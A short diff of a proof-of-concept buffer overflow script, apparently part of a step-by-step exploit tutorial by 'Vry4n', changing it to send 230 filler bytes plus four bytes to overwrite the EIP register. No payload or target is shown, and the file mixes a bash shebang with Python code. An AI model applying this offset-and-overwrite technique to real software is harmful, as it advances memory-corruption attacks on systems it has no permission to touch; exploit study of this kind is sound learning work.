@@ -1,8 +1,8 @@
 #!/bin/bash
 import socket
 
-# Part 3 of proof of concept by Vry4n
-# This script is intended send a pattern created with Metasploit pattern_create.rb script
+# Part 4 of proof of concept by Vry4n
+# This script is intended the specific stack crash and 4 more characters to overwrite the EIP
 
 FUZZ = "A" * 230
 EIP = "B" * 4
